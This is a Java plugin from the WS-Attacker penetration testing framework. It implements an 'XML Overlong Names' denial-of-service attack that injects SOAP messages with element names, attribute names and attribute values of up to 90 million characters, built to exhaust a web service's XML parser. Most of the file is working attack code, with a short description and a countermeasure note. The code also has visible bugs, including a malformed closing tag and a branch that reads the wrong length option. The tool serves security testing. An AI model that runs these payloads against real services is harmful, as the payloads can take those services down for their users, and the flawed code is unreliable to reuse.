/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import java.util.HashMap;
import java.util.Map;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlOverlongNames extends AbstractDosPlugin {

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;
    // </editor-fold>
    // Custom Attributes
    private OptionSimpleBoolean optionParam8;
    private AbstractOptionInteger optionParam9;
    private OptionSimpleBoolean optionParam10;
    private AbstractOptionInteger optionParam11;
    private OptionSimpleBoolean optionParam12;
    private AbstractOptionInteger optionParam13;

    @Override
    public void initializeDosPlugin() {
        initData();
        // Custom Initilisation
        optionParam8 = new OptionSimpleBoolean("XML overlong element name", true, "checked = XML overlong element name attack enabled");
        optionParam9 = new OptionLimitedInteger("XML overlong element name: Length", 100000, "Length of overlong element name", 1, 90000000);
        optionParam10 = new OptionSimpleBoolean("XML overlong attribute name", true, "checked = XML overlong attribute name attack enabled");
        optionParam11 = new OptionLimitedInteger("XML overlong attribute name: Length", 100000, "Length of overlong attribute name", 1, 90000000);
        optionParam12 = new OptionSimpleBoolean("XML overlong attribute value", true, "checked = XML overlong attribute value attack enabled");
        optionParam13 = new OptionLimitedInteger("XML overlong attribute value: Lenght", 100000, "Length of overlong attribute value", 1, 90000000);

        getPluginOptions().add(optionParam8);
        getPluginOptions().add(optionParam9);
        getPluginOptions().add(optionParam10);
        getPluginOptions().add(optionParam11);
        getPluginOptions().add(optionParam12);
        getPluginOptions().add(optionParam13);

    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
    }

    public void initData() {
        setName("XML Overlong Names Attack");
        setDescription("This attack checks whether or not a Web service is vulnerable to the \"XML Overlong Names\" attack. "
          + "A vulnerable Web service will run out of resources when trying to parse an XML message with overlong names.\n"
          + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_MegaTags"
          + "\n\n"
          + "The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below \n"
          + "with the payload defined in parameter 8-10.\n"
          + "The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message"
          + "\n\n"
          + "The following parameters can be used to insert overlong names:\n"
          + "- Param 8.1: Only if enabled,length of an overlong element name in kb\n"
          + "- Param 9.1: Only if enabled, length of an overlong attribute name in kb\n"
          + "- Param 10.1: Only if enabled, length of overlong attribute content in kb\n"
          + "\n\n"
          + "The attack parameters 8, 9 and 10 are independent of each other. \n"
          + "Each subattack will be inserted in a seperate element.\n"
          + "A change in one parameter has no effect on the other."
          + "\n\n");
        setCountermeasures("In order to counter the attack, strict XML schema validation should be performed to catch these oversized nodes and values.");
    }

    @Override
    public void createTamperedRequest() {

        StringBuilder sb = new StringBuilder("");

        // elementname
        if (optionParam8.isOn()) {
            sb.append("<");
            for (int i = 1; i < (optionParam9.getValue()); i++) {
                sb.append("A");
            }
            sb.append(">test<\"");
            for (int i = 1; i < (optionParam9.getValue()); i++) {
                sb.append("A");
            }
            sb.append(">");
        }

        // attributename
        if (optionParam10.isOn()) {
            sb.append("<abc ");
            for (int i = 1; i < (optionParam11.getValue()); i++) {
                sb.append("B");
            }
            sb.append("=\"test\">value</abc>");
        }

        // attributecontent
        if (optionParam12.isOn()) {
            sb.append("<def long=\"");
            for (int i = 1; i < (optionParam11.getValue()); i++) {
                sb.append("C");
            }
            sb.append("\">value</def>");
        }

        // replace "Payload-Attribute" with Payload-String
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());

        // get HeaderFields from original request, if required add custom headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
            httpHeaderMap.put(entry.getKey(), entry.getValue());
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
